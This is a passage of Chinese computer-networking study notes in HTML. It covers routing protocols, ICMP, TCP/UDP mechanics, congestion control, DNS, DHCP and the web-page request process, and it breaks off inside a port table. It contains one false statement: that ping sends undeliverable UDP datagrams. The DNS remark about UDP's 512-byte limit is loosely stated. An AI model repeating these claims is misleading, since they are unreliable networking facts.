的路由，则把数据报传送给路由表中所指明的下一跳路由器；</li><li>若路由表中有一个默认路由，则把数据报传送给路由表中所指明的默认路由器；</li><li>报告转发分组出错。</li></ol><p><div align="center"> <img src="/images/posts/1ab49e39-012b-4383-8284-26570987e3c4.jpg" width="800"> </div><br></p><h2 id="路由选择协议"><a href="#路由选择协议" class="headerlink" title="路由选择协议"></a>路由选择协议</h2><p>互联网使用的路由选择协议都是自适应的，能随着网络通信量和拓扑结构的变化而自适应地进行调整。</p><p>互联网可以划分为许多较小的自治系统 AS，一个 AS 可以使用一种和别的 AS 不同的路由选择协议。</p><p>可以把路由选择协议划分为两大类：</p><ol><li>内部网关协议 IGP（Interior Gateway Protocol）：在 AS 内部使用，如 RIP 和 OSPF。</li><li>外部网关协议 EGP（External Gateway Protocol）：在 AS 之间使用，如 BGP。</li></ol><p><div align="center"> <img src="/images/posts/276c31df-3b28-4ac2-b006-1e80fc86a64f.jpg" width="600"> </div><br></p><h3 id="1-内部网关协议-RIP"><a href="#1-内部网关协议-RIP" class="headerlink" title="1. 内部网关协议 RIP"></a>1. 内部网关协议 RIP</h3><p>RIP 是一种分布式的基于距离向量的路由选择协议。距离是指跳数，直接相连的路由器跳数为 1，跳数最多为 15，超过 15 表示不可达。</p><p>RIP 按固定的时间间隔仅和相邻路由器交换自己的路由表，经过若干次交换之后，所有路由器最终会知道到达本自治系统中任何一个网络的最短距离和下一跳路由器地址。</p><p>距离向量算法：</p><ol><li>对地址为 X 的相邻路由器发来的 RIP 报文，先修改报文中的所有项目，把下一跳字段中的地址改为 X，并把所有的距离字段加 1；</li><li>对修改后的 RIP 报文中的每一个项目，进行以下步骤：<ul><li>若原来的路由表中没有目的网络 N，则把该项目添加到路由表中；</li><li>否则：若下一跳路由器地址是 X，则把收到的项目替换原来路由表中的项目；否则：若收到的项目中的距离 d 小于路由表中的距离，则进行更新（例如原始路由表项为 Net2, 5, P，新表项为 Net2, 4, X，则更新）；否则什么也不做。</li></ul></li><li>若 3 分钟还没有收到相邻路由器的更新路由表，则把该相邻路由器标为不可达，即把距离置为 16。</li></ol><p>RIP 协议实现简单，开销小，但是 RIP 能使用的最大距离为 15，限制了网络的规模。并且当网络出现故障时，要经过比较长的时间才能将此消息传送到所有路由器。</p><h3 id="2-内部网关协议-OSPF"><a href="#2-内部网关协议-OSPF" class="headerlink" title="2. 内部网关协议 OSPF"></a>2. 内部网关协议 OSPF</h3><p>开放最短路径优先 OSPF，是为了克服 RIP 的缺点而开发出来的。</p><p>开放表示 OSPF 不受某一家厂商控制，而是公开发表的；最短路径优先表示使用了 Dijkstra 提出的最短路径算法 SPF。</p><p>OSPF 具有以下特点：</p><ul><li>向本自治系统中的所有路由器发送信息，这种方法是洪泛法。</li><li>发送的信息就是与相邻路由器的链路状态，链路状态包括与哪些路由器相连以及链路的度量，度量用费用、距离、时延、带宽等来表示。</li><li>只有当链路状态发生变化时，路由器才会发送信息。</li></ul><p>所有路由器都具有全网的拓扑结构图，并且是一致的。相比于 RIP，OSPF 的更新过程收敛的很快。</p><h3 id="3-外部网关协议-BGP"><a href="#3-外部网关协议-BGP" class="headerlink" title="3. 外部网关协议 BGP"></a>3. 外部网关协议 BGP</h3><p>AS 之间的路由选择很困难，主要是互联网规模很大。并且各个 AS 内部使用不同的路由选择协议，就无法准确定义路径的度量。并且 AS 之间的路由选择必须考虑有关的策略，比如有些 AS 不愿意让其它 AS 经过。</p><p>BGP 只能寻找一条比较好的路由，而不是最佳路由。它采用路径向量路由选择协议。</p><p>每个 AS 都必须配置 BGP 发言人，通过在两个相邻 BGP 发言人之间建立 TCP 连接来交换路由信息。</p><p><div align="center"> <img src="/images/posts/9cd0ae20-4fb5-4017-a000-f7d3a0eb3529.png" width="600"> </div><br></p><h2 id="网际控制报文协议-ICMP"><a href="#网际控制报文协议-ICMP" class="headerlink" title="网际控制报文协议 ICMP"></a>网际控制报文协议 ICMP</h2><p>ICMP 是为了更有效地转发 IP 数据报和提高交付成功的机会。它封装在 IP 数据报中，但是不属于高层协议。</p><p><div align="center"> <img src="/images/posts/e3124763-f75e-46c3-ba82-341e6c98d862.jpg" width="500"> </div><br></p><p>ICMP 报文分为差错报告报文和询问报文。</p><p><div align="center"> <img src="/images/posts/aa29cc88-7256-4399-8c7f-3cf4a6489559.png" width="600"> </div><br></p><h2 id="分组网间探测-PING"><a href="#分组网间探测-PING" class="headerlink" title="分组网间探测 PING"></a>分组网间探测 PING</h2><p>PING 是 ICMP 的一个重要应用，主要用来测试两台主机之间的连通性。</p><p>Ping 发送的 IP 数据报封装的是无法交付的 UDP 用户数据报。</p><h2 id="Traceroute"><a href="#Traceroute" class="headerlink" title="Traceroute"></a>Traceroute</h2><p>Traceroute 是 ICMP 的另一个应用，用来跟踪一个分组从源点到终点的路径。</p><ol><li>源主机向目的主机发送一连串的 IP 数据报。第一个数据报 P1 的生存时间 TTL 设置为 1，但 P1 到达路径上的第一个路由器 R1 时，R1 收下它并把 TTL 减 1，此时 TTL 等于 0，R1 就把 P1 丢弃，并向源主机发送一个 ICMP 时间超过差错报告报文；</li><li>源主机接着发送第二个数据报 P2，并把 TTL 设置为 2。P2 先到达 R1，R1 收下后把 TTL 减 1 再转发给 R2，R2 收下后也把 TTL 减 1，由于此时 TTL 等于 0，R2 就丢弃 P2，并向源主机发送一个 ICMP 时间超过差错报文。</li><li>不断执行这样的步骤，直到最后一个数据报刚刚到达目的主机，主机不转发数据报，也不把 TTL 值减 1。但是因为数据报封装的是无法交付的 UDP，因此目的主机要向源主机发送 ICMP 终点不可达差错报告报文。</li><li>之后源主机知道了到达目的主机所经过的路由器 IP 地址以及到达每个路由器的往返时间。</li></ol><h2 id="虚拟专用网-VPN"><a href="#虚拟专用网-VPN" class="headerlink" title="虚拟专用网 VPN"></a>虚拟专用网 VPN</h2><p>由于 IP 地址的紧缺，一个机构能申请到的 IP 地址数往往远小于本机构所拥有的主机数。并且一个机构并不需要把所有的主机接入到外部的互联网中，机构内的计算机可以使用仅在本机构有效的 IP 地址（专用地址）。</p><p>有三个专用地址块：</p><ol><li>10.0.0.0 ~ 10.255.255.255</li><li>172.16.0.0 ~ 172.31.255.255</li><li>192.168.0.0 ~ 192.168.255.255</li></ol><p>VPN 使用公用的互联网作为本机构各专用网之间的通信载体。专用指机构内的主机只与本机构内的其它主机通信；虚拟指“好像是”，而实际上并不是，它有经过公用的互联网。</p><p>下图中，场所 A 和 B 的通信经过互联网，如果场所 A 的主机 X 要和另一个场所 B 的主机 Y 通信，IP 数据报的源地址是 10.1.0.1，目的地址是 10.2.0.3。数据报先发送到与互联网相连的路由器 R1，R1 对内部数据进行加密，然后重新加上数据报的首部，源地址是路由器 R1 的全球地址 125.1.2.3，目的地址是路由器 R2 的全球地址 194.4.5.6。路由器 R2 收到数据报后将数据部分进行解密，恢复原来的数据报，此时目的地址为 10.2.0.3，就交付给 Y。</p><p><div align="center"> <img src="/images/posts/1556770b-8c01-4681-af10-46f1df69202c.jpg" width="800"> </div><br></p><h2 id="网络地址转换-NAT"><a href="#网络地址转换-NAT" class="headerlink" title="网络地址转换 NAT"></a>网络地址转换 NAT</h2><p>专用网内部的主机使用本地 IP 地址又想和互联网上的主机通信时，可以使用 NAT 来将本地 IP 转换为全球 IP。</p><p>在以前，NAT 将本地 IP 和全球 IP 一一对应，这种方式下拥有 n 个全球 IP 地址的专用网内最多只可以同时有 n 台主机接入互联网。为了更有效地利用全球 IP 地址，现在常用的 NAT 转换表把运输层的端口号也用上了，使得多个专用网内部的主机共用一个全球 IP 地址。使用端口号的 NAT 也叫做网络地址与端口转换 NAPT。</p><p><div align="center"> <img src="/images/posts/2719067e-b299-4639-9065-bed6729dbf0b.png" width=""> </div><br></p><h1 id="五、运输层"><a href="#五、运输层" class="headerlink" title="五、运输层*"></a>五、运输层*</h1><p>网络层只把分组发送到目的主机，但是真正通信的并不是主机而是主机中的进程。运输层提供了进程间的逻辑通信，运输层向高层用户屏蔽了下面网络层的核心细节，使应用程序看见的好像在两个运输层实体之间有一条端到端的逻辑通信信道。</p><h2 id="UDP-和-TCP-的特点"><a href="#UDP-和-TCP-的特点" class="headerlink" title="UDP 和 TCP 的特点"></a>UDP 和 TCP 的特点</h2><ul><li><p>用户数据报协议 UDP（User Datagram Protocol）是无连接的，尽最大可能交付，没有拥塞控制，面向报文（对于应用程序传下来的报文不合并也不拆分，只是添加 UDP 首部）。</p></li><li><p>传输控制协议 TCP（Transmission Control Protocol）是面向连接的，提供可靠交付，有流量控制，拥塞控制，提供全双工通信，面向字节流（把应用层传下来的报文看成字节流，把字节流组织成大小不等的数据块）。</p></li></ul><h2 id="UDP-首部格式"><a href="#UDP-首部格式" class="headerlink" title="UDP 首部格式"></a>UDP 首部格式</h2><p><div align="center"> <img src="/images/posts/d4c3a4a1-0846-46ec-9cc3-eaddfca71254.jpg" width="600"> </div><br></p><p>首部字段只有 8 个字节，包括源端口、目的端口、长度、检验和。12 字节的伪首部是为了计算检验和临时添加的。</p><h2 id="TCP-首部格式"><a href="#TCP-首部格式" class="headerlink" title="TCP 首部格式"></a>TCP 首部格式</h2><p><div align="center"> <img src="/images/posts/55dc4e84-573d-4c13-a765-52ed1dd251f9.png" width="700"> </div><br></p><ul><li><p><strong>序号</strong>  ：用于对字节流进行编号，例如序号为 301，表示第一个字节的编号为 301，如果携带的数据长度为 100 字节，那么下一个报文段的序号应为 401。</p></li><li><p><strong>确认号</strong>  ：期望收到的下一个报文段的序号。例如 B 正确收到 A 发送来的一个报文段，序号为 501，携带的数据长度为 200 字节，因此 B 期望下一个报文段的序号为 701，B 发送给 A 的确认报文段中确认号就为 701。</p></li><li><p><strong>数据偏移</strong>  ：指的是数据部分距离报文段起始处的偏移量，实际上指的是首部的长度。</p></li><li><p><strong>确认 ACK</strong>  ：当 ACK=1 时确认号字段有效，否则无效。TCP 规定，在连接建立后所有传送的报文段都必须把 ACK 置 1。</p></li><li><p><strong>同步 SYN</strong>  ：在连接建立时用来同步序号。当 SYN=1，ACK=0 时表示这是一个连接请求报文段。若对方同意建立连接，则响应报文中 SYN=1，ACK=1。</p></li><li><p><strong>终止 FIN</strong>  ：用来释放一个连接，当 FIN=1 时，表示此报文段的发送方的数据已发送完毕，并要求释放运输连接。</p></li><li><p><strong>窗口</strong>  ：窗口值作为接收方让发送方设置其发送窗口的依据。之所以要有这个限制，是因为接收方的数据缓存空间是有限的。</p></li></ul><h2 id="TCP-的三次握手"><a href="#TCP-的三次握手" class="headerlink" title="TCP 的三次握手"></a>TCP 的三次握手</h2><p><div align="center"> <img src="/images/posts/e92d0ebc-7d46-413b-aec1-34a39602f787.png" width="600"> </div><br></p><p>假设 A 为客户端，B 为服务器端。</p><ol><li><p>首先 B 处于 LISTEN（监听）状态，等待客户的连接请求。</p></li><li><p>A 向 B 发送连接请求报文段，SYN=1，ACK=0，选择一个初始的序号 x。</p></li><li><p>B 收到连接请求报文段，如果同意建立连接，则向 A 发送连接确认报文段，SYN=1，ACK=1，确认号为 x+1，同时也选择一个初始的序号 y。</p></li><li><p>A 收到 B 的连接确认报文段后，还要向 B 发出确认，确认号为 y+1，序号为 x+1。</p></li><li><p>B 收到 A 的确认后，连接建立。</p></li></ol><p><strong>三次握手的原因</strong> </p><p>第三次握手是为了防止失效的连接请求到达服务器，让服务器错误打开连接。</p><p>失效的连接请求是指，客户端发送的连接请求在网络中滞留，客户端因为没及时收到服务器端发送的连接确认，因此就重新发送了连接请求。滞留的连接请求并不是丢失，之后还是会到达服务器。如果不进行第三次握手，那么服务器会误认为客户端重新请求连接，然后打开了连接。但是并不是客户端真正打开这个连接，因此客户端不会给服务器发送数据，这个连接就白白浪费了。</p><h2 id="TCP-的四次挥手"><a href="#TCP-的四次挥手" class="headerlink" title="TCP 的四次挥手"></a>TCP 的四次挥手</h2><p><div align="center"> <img src="/images/posts/f87afe72-c2df-4c12-ac03-9b8d581a8af8.jpg" width="600"> </div><br></p><p>以下描述不讨论序号和确认号，因为序号和确认号的规则比较简单。并且不讨论 ACK，因为 ACK 在连接建立之后都为 1。</p><ol><li><p>A 发送连接释放报文段，FIN=1。</p></li><li><p>B 收到之后发出确认，此时 TCP 属于半关闭状态，B 能向 A 发送数据但是 A 不能向 B 发送数据。</p></li><li><p>当 B 要不再需要连接时，发送连接释放请求报文段，FIN=1。</p></li><li><p>A 收到后发出确认，进入 TIME-WAIT 状态，等待 2MSL 时间后释放连接。</p></li><li><p>B 收到 A 的确认后释放连接。</p></li></ol><p><strong>四次挥手的原因</strong> </p><p>客户端发送了 FIN 连接释放报文之后，服务器收到了这个报文，就进入了 CLOSE-WAIT 状态。这个状态是为了让服务器端发送还未传送完毕的数据，传送完毕之后，服务器会发送 FIN 连接释放报文。</p><p><strong>TIME_WAIT</strong> </p><p>客户端接收到服务器端的 FIN 报文后进入此状态，此时并不是直接进入 CLOSED 状态，还需要等待一个时间计时器设置的时间 2MSL。这么做有两个理由：</p><ol><li><p>确保最后一个确认报文段能够到达。如果 B 没收到 A 发送来的确认报文段，那么就会重新发送连接释放请求报文段，A 等待一段时间就是为了处理这种情况的发生。</p></li><li><p>等待一段时间是为了让本连接持续时间内所产生的所有报文段都从网络中消失，使得下一个新的连接不会出现旧的连接请求报文段。</p></li></ol><h2 id="TCP-滑动窗口"><a href="#TCP-滑动窗口" class="headerlink" title="TCP 滑动窗口"></a>TCP 滑动窗口</h2><p><div align="center"> <img src="/images/posts/a3253deb-8d21-40a1-aae4-7d178e4aa319.jpg" width="800"> </div><br></p><p>窗口是缓存的一部分，用来暂时存放字节流。发送方和接收方各有一个窗口，接收方通过 TCP 报文段中的窗口字段告诉发送方自己的窗口大小，发送方根据这个值和其它信息设置自己的窗口大小。</p><p>发送窗口内的字节都允许被发送，接收窗口内的字节都允许被接收。如果发送窗口左部的字节已经发送并且收到了确认，那么就将发送窗口向右滑动一定距离，直到左部第一个字节不是已发送并且已确认的状态；接收窗口的滑动类似，接收窗口左部字节已经发送确认并交付主机，就向右滑动接收窗口。</p><p>接收窗口只会对窗口内最后一个按序到达的字节进行确认，例如接收窗口已经收到的字节为 {31, 32, 34, 35}，其中 {31, 32} 按序到达，而 {34, 35} 就不是，因此只对字节 32 进行确认。发送方得到一个字节的确认之后，就知道这个字节之前的所有字节都已经被接收。</p><h2 id="TCP-可靠传输"><a href="#TCP-可靠传输" class="headerlink" title="TCP 可靠传输"></a>TCP 可靠传输</h2><p>TCP 使用超时重传来实现可靠传输：如果一个已经发送的报文段在超时时间内没有收到确认，那么就重传这个报文段。</p><p>一个报文段从发送再到接收到确认所经过的时间称为往返时间 RTT，加权平均往返时间 RTTs 计算如下：</p><p><div align="center"><img src="https://latex.codecogs.com/gif.latex?RTTs=(1-a)*(RTTs)+a*RTT"></div> <br></p><p>超时时间 RTO 应该略大于 RTTs，TCP 使用的超时时间计算如下：</p><p><div align="center"><img src="https://latex.codecogs.com/gif.latex?RTO=RTTs+4*RTT_d"></div> <br></p><p>其中 RTT<sub>d</sub> 为偏差。</p><h2 id="TCP-流量控制"><a href="#TCP-流量控制" class="headerlink" title="TCP 流量控制"></a>TCP 流量控制</h2><p>流量控制是为了控制发送方发送速率，保证接收方来得及接收。</p><p>接收方发送的确认报文中的窗口字段可以用来控制发送方窗口大小，从而影响发送方的发送速率。将窗口字段设置为 0，则发送方不能发送数据。</p><h2 id="TCP-拥塞控制"><a href="#TCP-拥塞控制" class="headerlink" title="TCP 拥塞控制"></a>TCP 拥塞控制</h2><p>如果网络出现拥塞，分组将会丢失，此时发送方会继续重传，从而导致网络拥塞程度更高。因此当出现拥塞时，应当控制发送方的速率。这一点和流量控制很像，但是出发点不同。流量控制是为了让接收方能来得及接受，而拥塞控制是为了降低整个网络的拥塞程度。</p><p><div align="center"> <img src="/images/posts/51e2ed95-65b8-4ae9-8af3-65602d452a25.jpg" width="500"> </div><br></p><p>TCP 主要通过四种算法来进行拥塞控制：慢开始、拥塞避免、快重传、快恢复。发送方需要维护一个叫做拥塞窗口（cwnd）的状态变量。注意拥塞窗口与发送方窗口的区别，拥塞窗口只是一个状态变量，实际决定发送方能发送多少数据的是发送方窗口。</p><p>为了便于讨论，做如下假设：</p><ol><li>接收方有足够大的接收缓存，因此不会发生流量控制；</li><li>虽然 TCP 的窗口基于字节，但是这里设窗口的大小单位为报文段。</li></ol><p><div align="center"> <img src="/images/posts/910f613f-514f-4534-87dd-9b4699d59d31.png" width="800"> </div><br></p><h3 id="1-慢开始与拥塞避免"><a href="#1-慢开始与拥塞避免" class="headerlink" title="1. 慢开始与拥塞避免"></a>1. 慢开始与拥塞避免</h3><p>发送的最初执行慢开始，令 cwnd=1，发送方只能发送 1 个报文段；当收到确认后，将 cwnd 加倍，因此之后发送方能够发送的报文段数量为：2、4、8 …</p><p>注意到慢开始每个轮次都将 cwnd 加倍，这样会让 cwnd 增长速度非常快，从而使得发送方发送的速度增长速度过快，网络拥塞的可能也就更高。设置一个慢开始门限 ssthresh，当 cwnd &gt;= ssthresh 时，进入拥塞避免，每个轮次只将 cwnd 加 1。</p><p>如果出现了超时，则令 ssthresh = cwnd/2，然后重新执行慢开始。</p><h3 id="2-快重传与快恢复"><a href="#2-快重传与快恢复" class="headerlink" title="2. 快重传与快恢复"></a>2. 快重传与快恢复</h3><p>在接收方，要求每次接收到报文段都应该发送对已收到有序报文段的确认，例如已经接收到 M<sub>1</sub> 和 M<sub>2</sub>，此时收到 M<sub>4</sub>，应当发送对 M<sub>2</sub> 的确认。</p><p>在发送方，如果收到三个重复确认，那么可以确认下一个报文段丢失，例如收到三个 M<sub>2</sub> ，则 M<sub>3</sub> 丢失。此时执行快重传，立即重传下一个报文段。</p><p>在这种情况下，只是丢失个别报文段，而不是网络拥塞，因此执行快恢复，令 ssthresh = cwnd/2 ，cwnd = ssthresh，注意到此时直接进入拥塞避免。</p><p><div align="center"> <img src="/images/posts/f61b5419-c94a-4df1-8d4d-aed9ae8cc6d5.png" width="600"> </div><br></p><h1 id="六、应用层"><a href="#六、应用层" class="headerlink" title="六、应用层*"></a>六、应用层*</h1><h2 id="域名系统-DNS"><a href="#域名系统-DNS" class="headerlink" title="域名系统 DNS"></a>域名系统 DNS</h2><p>把主机名解析为 IP 地址。</p><p>被设计成分布式系统。</p><h3 id="1-层次结构"><a href="#1-层次结构" class="headerlink" title="1. 层次结构"></a>1. 层次结构</h3><p>一个域名由多个层次构成，从上层到下层分别为顶级域名、二级域名、三级域名以及四级域名。所有域名可以画成一颗域名树。</p><p><div align="center"> <img src="/images/posts/c2117f61-1177-4768-bf33-cf4f950d911c.png" width=""> </div><br></p><p><div align="center"> <img src="/images/posts/a4b162e5-db2a-4a27-b213-1fe481c5a06a.png" width=""> </div><br></p><p>域名服务器可以分为以下四类：</p><ol><li>根域名服务器：解析顶级域名；</li><li>顶级域名服务器：解析二级域名；</li><li>权限域名服务器：解析区内的域名；</li><li>本地域名服务器：也称为默认域名服务器。可以在其中配置高速缓存。</li></ol><p>区和域的概念不同，可以在一个域中划分多个区。图 b 在域 abc.com 中划分了两个区：abc.com 和 y.abc.com</p><p><div align="center"> <img src="/images/posts/fc0c6b2d-68c7-4de8-aaaa-97355a4f0472.jpg" width=""> </div><br></p><p>因此就需要两个权限域名服务器：</p><p><div align="center"> <img src="/images/posts/8b335d94-c1ca-42e1-ad48-bb179d28a4f1.jpg" width=""> </div><br></p><h3 id="2-解析过程"><a href="#2-解析过程" class="headerlink" title="2. 解析过程"></a>2. 解析过程</h3><p>主机向本地域名服务器解析的过程采用递归，而本地域名服务器向其它域名服务器解析可以使用递归和迭代两种方式。</p><p>迭代的方式下，本地域名服务器向一个域名服务器解析请求解析之后，结果返回到本地域名服务器，然后本地域名服务器继续向其它域名服务器请求解析；而递归的方式下，结果不是直接返回的，而是继续向前请求解析，最后的结果才会返回。</p><p><div align="center"> <img src="/images/posts/e6723b94-1a33-4605-b775-f6813352d383.png" width="800"> </div><br></p><h3 id="3-使用的运输层协议"><a href="#3-使用的运输层协议" class="headerlink" title="3. 使用的运输层协议"></a>3. 使用的运输层协议</h3><p>DNS 在解析的过程使用 UDP 进行传输，因为 UDP 最大只支持 512 字节的数据，如果超过的话就需要使用 TCP 传输。</p><h2 id="文件传输协议-FTP"><a href="#文件传输协议-FTP" class="headerlink" title="文件传输协议 FTP"></a>文件传输协议 FTP</h2><p>FTP 在运输层使用 TCP，并且需要建立两个并行的 TCP 连接：控制连接和数据连接。控制连接在整个会话期间一直保持打开，而数据连接在数据传送完毕之后就关闭。控制连接使用端口号 21，数据连接使用端口号 20。</p><p><div align="center"> <img src="/images/posts/30210b86-472d-4574-abb6-b74898cc17a4.jpg" width="700"> </div><br></p><h2 id="远程终端协议-TELNET"><a href="#远程终端协议-TELNET" class="headerlink" title="远程终端协议 TELNET"></a>远程终端协议 TELNET</h2><p>TELNET 用于登录到远程主机上，并且远程主机上的输出也会返回。</p><p>TELNET 可以适应许多计算机和操作系统的差异，例如不同操作系统系统的换行符定义。</p><h2 id="电子邮件协议"><a href="#电子邮件协议" class="headerlink" title="电子邮件协议"></a>电子邮件协议</h2><p>一个电子邮件系统由三部分组成：用户代理、邮件服务器以及邮件发送协议和读取协议。其中发送协议常用 SMTP，读取协议常用 POP3 和 IMAP。</p><p><div align="center"> <img src="/images/posts/7b3efa99-d306-4982-8cfb-e7153c33aab4.png" width="700"> </div><br></p><h3 id="1-POP3"><a href="#1-POP3" class="headerlink" title="1. POP3"></a>1. POP3</h3><p>POP3 的特点是只要用户从服务器上读取了邮件，就把该邮件删除。</p><h3 id="2-IMAP"><a href="#2-IMAP" class="headerlink" title="2. IMAP"></a>2. IMAP</h3><p>IMAP 协议中客户端和服务器上的邮件保持同步，如果不去手动删除邮件，那么服务器上的邮件也不会被删除。IMAP 这种做法可以让用户随时随地去访问服务器上的邮件。IMAP 协议也支持创建自定义的文件夹。</p><h3 id="3-SMTP"><a href="#3-SMTP" class="headerlink" title="3. SMTP"></a>3. SMTP</h3><p>SMTP 只能发送 ASCII 码，而互联网邮件扩充 MIME 可以发送二进制文件。MIME 并没有改动或者取代 SMTP，而是增加邮件主题的结构，定义了非 ASCII 码的编码规则。</p><p><div align="center"> <img src="/images/posts/ed5522bb-3a60-481c-8654-43e7195a48fe.png" width=""> </div><br></p><h2 id="动态主机配置协议-DHCP"><a href="#动态主机配置协议-DHCP" class="headerlink" title="动态主机配置协议 DHCP"></a>动态主机配置协议 DHCP</h2><p>DHCP 提供了即插即用的连网方式，用户不再需要去手动配置 IP 地址等信息。</p><p>DHCP 配置的内容不仅是 IP 地址，还包括子网掩码、默认路由器 IP 地址、域名服务器的 IP 地址。</p><p>工作方式如下：需要 IP 地址的主机广播发送 DHCP 发现报文（将目的地址置为全 1，即 255.255.255.255:67，源地址设置为全 0，即 0.0.0.0:68），DHCP 服务器收到发现报文之后，则在 IP 地址池中取一个地址，发送 DHCP 提供报文给该主机。</p><h2 id="点对点传输-P2P"><a href="#点对点传输-P2P" class="headerlink" title="点对点传输 P2P"></a>点对点传输 P2P</h2><p>把某个文件分发的所有对等集合称为一个洪流。文件的数据单元称为文件块，它的大小是固定的。一个新的对等方加入某个洪流，一开始并没有文件块，但是能够从其它对等方中逐渐地下载到一些文件块，与此同时，它也为别的对等方上传一些文件块。</p><p>每个洪流都有一个基础设施，称为追踪器。当一个对等方加入洪流时，必须向追踪器登记，并周期性地通知追踪器它仍在洪流中。可以在任何时间加入和退出某个洪流。</p><p>一个新的对等方加入洪流时，追踪器会随机从洪流中选择若干个对等方，并让新对等方与这些对等方建立连接，把这些对等方称为相邻对等方。接收和发送文件块都是在相邻对等方中进行。</p><p>当一个对等方需要很多文件块时，通过使用最稀有优先的策略来取得文件块，也就是一个文件块在相邻对等方中副本最少，那么就优先请求这个文件块。</p><p>当很多对等方向同一个对等方请求文件块时，该对等方优先选择以最高速率向其发送文件块的对等方。</p><p>P2P 是一个分布式系统，任何时候都有对等方加入或者退出。使用分布式散列表 DHT，可以查找洪流中的资源和 IP 地址映射。</p><h2 id="Web-页面请求过程"><a href="#Web-页面请求过程" class="headerlink" title="Web 页面请求过程"></a>Web 页面请求过程</h2><h3 id="1-DHCP-配置主机信息"><a href="#1-DHCP-配置主机信息" class="headerlink" title="1. DHCP 配置主机信息"></a>1. DHCP 配置主机信息</h3><ol><li><p>假设主机最开始没有 IP 地址以及其它信息，那么就需要先使用 DHCP 来获取。</p></li><li><p>主机生成一个 DHCP 请求报文，并将这个报文放入具有目的端口 67 和源端口 68 的 UDP 报文段中。</p></li><li><p>该报文段则被放入在一个具有广播 IP 目的地址(255.255.255.255) 和源 IP 地址（0.0.0.0）的 IP 数据报中。</p></li><li><p>该数据报则被放置在 MAC 帧中，该帧具有目的地址 FF:FF:FF:FF:FF:FF，将广播到与交换机连接的所有设备。</p></li><li><p>连接在交换机的 DHCP 服务器收到广播帧之后，不断地向上分解得到 IP 数据报、UDP 报文段、DHCP 请求报文，之后生成 DHCP ACK 报文，该报文包含以下信息：IP 地址、DNS 服务器的 IP 地址、默认网关路由器的 IP 地址和子网掩码。该报文被放入 UDP 报文段中，UDP 报文段有被放入 IP 数据报中，最后放入 MAC 帧中。</p></li><li><p>该帧的目的地址是请求主机的 MAC 地址，因为交换机具有自学习能力，之前主机发送了广播帧之后就记录了 MAC 地址到其转发接口的交换表项，因此现在交换机就可以直接知道应该向哪个接口发送该帧。</p></li><li><p>主机收到该帧后，不断分解得到 DHCP 报文。之后就配置它的 IP 地址、子网掩码和 DNS 服务器的 IP 地址，并在其 IP 转发表中安装默认网关。</p></li></ol><h3 id="2-ARP-解析-MAC-地址"><a href="#2-ARP-解析-MAC-地址" class="headerlink" title="2. ARP 解析 MAC 地址"></a>2. ARP 解析 MAC 地址</h3><ol><li><p>主机通过浏览器生成一个 TCP 套接字，套接字向 HTTP 服务器发送 HTTP 请求。为了生成该套接字，主机需要知道网站的域名对应的 IP 地址。</p></li><li><p>主机生成一个 DNS 查询报文，该报文具有 53 号端口，因为 DNS 服务器的端口号是 53。</p></li><li><p>该 DNS 查询报文被放入目的地址为 DNS 服务器 IP 地址的 IP 数据报中。</p></li><li><p>该 IP 数据报被放入一个以太网帧中，该帧将发送到网关路由器。</p></li><li><p>DHCP 过程只知道网关路由器的 IP 地址，为了获取网关路由器的 MAC 地址，需要使用 ARP 协议。</p></li><li><p>主机生成一个包含目的地址为网关路由器 IP 地址的 ARP 查询报文，将该 ARP 查询报文放入一个具有广播目的地址（FF:FF:FF:FF:FF:FF）的以太网帧中，并向交换机发送该以太网帧，交换机将该帧转发给所有的连接设备，包括网关路由器。</p></li><li><p>网关路由器接收到该帧后，不断向上分解得到 ARP 报文，发现其中的 IP 地址与其接口的 IP 地址匹配，因此就发送一个 ARP 回答报文，包含了它的 MAC 地址，发回给主机。</p></li></ol><h3 id="3-DNS-解析域名"><a href="#3-DNS-解析域名" class="headerlink" title="3. DNS 解析域名"></a>3. DNS 解析域名</h3><ol><li><p>知道了网关路由器的 MAC 地址之后，就可以继续 DNS 的解析过程了。</p></li><li><p>网关路由器接收到包含 DNS 查询报文的以太网帧后，抽取出 IP 数据报，并根据转发表决定该 IP 数据报应该转发的路由器。</p></li><li><p>因为路由器具有内部网关协议（RIP、OSPF）和外部网关协议（BGP）这两种路由选择协议，因此路由表中已经配置了网关路由器到达 DNS 服务器的路由表项。</p></li><li><p>到达 DNS 服务器之后，DNS 服务器抽取出 DNS 查询报文，并在 DNS 数据库中查找待解析的域名。</p></li><li><p>找到 DNS 记录之后，发送 DNS 回答报文，将该回答报文放入 UDP 报文段中，然后放入 IP 数据报中，通过路由器反向转发回网关路由器，并经过以太网交换机到达主机。</p></li></ol><h3 id="4-HTTP-请求页面"><a href="#4-HTTP-请求页面" class="headerlink" title="4. HTTP 请求页面"></a>4. HTTP 请求页面</h3><ol><li><p>有了 HTTP 服务器的 IP 地址之后，主机就能够生成 TCP 套接字，该套接字将用于向 Web 服务器发送 HTTP GET 报文。</p></li><li><p>在生成 TCP 套接字之前，必须先与 HTTP 服务器进行三次握手来建立连接。生成一个具有目的端口 80 的 TCP SYN 报文段，并向 HTTP 服务器发送该报文段。</p></li><li><p>HTTP 服务器收到该报文段之后，生成 TCP SYNACK 报文段，发回给主机。</p></li><li><p>连接建立之后，浏览器生成 HTTP GET 报文，并交付给 HTTP 服务器。</p></li><li><p>HTTP 服务器从 TCP 套接字读取 HTTP GET 报文，生成一个 HTTP 响应报文，将 Web 页面内容放入报文主体中，发回给主机。</p></li><li><p>浏览器收到 HTTP 响应报文后，抽取出 Web 页面内容，之后进行渲染，显示 Web 页面。</p></li></ol><h2 id="常用端口"><a href="#常用端口" class="headerlink" title="常用端口"></a>常用端口</h2><table><thead><tr><th style="text-align:center">应用</th><th style="text-align:center">应用层协议</th><th style="text-align:center">端口号</th><th style="text-align:center">运输层协议</th><th style="text-align:center">备注</th></tr></thead><tbody><tr><td style="text-align:center">域名解析</td><td style="text-align:center">DNS</td><td style="text-align:center">53</td><td style="text-align:center">UDP/TCP</td><td style="text-align:center">长度超过 512 字节时使用 TCP</td></tr><tr><td style="text-align:center">动态主机配置协议</td><td style="text-align:center">DHCP</td><td style="text-align:center">67/68</td><td style="text-align:center">UDP</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">简单网络管理协议</td><td style="text-align:center">SNMP</td><td style="text-align:center">161/162</td><td style="text-align:center">UDP</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">文件传送协议</td><td style="text-align:center">FTP</td><td style="text-align:center">20/21</td><td style="text-align:center">TCP</td><td style="text-align:center">控制连接 21，数据连接 20</td></tr><tr><td style="text-align:center">远程终端协议</td><td style="text-align:center">TELNET</td><td style="text-align:center">23</td><td style="text-align:center">TCP</td><td 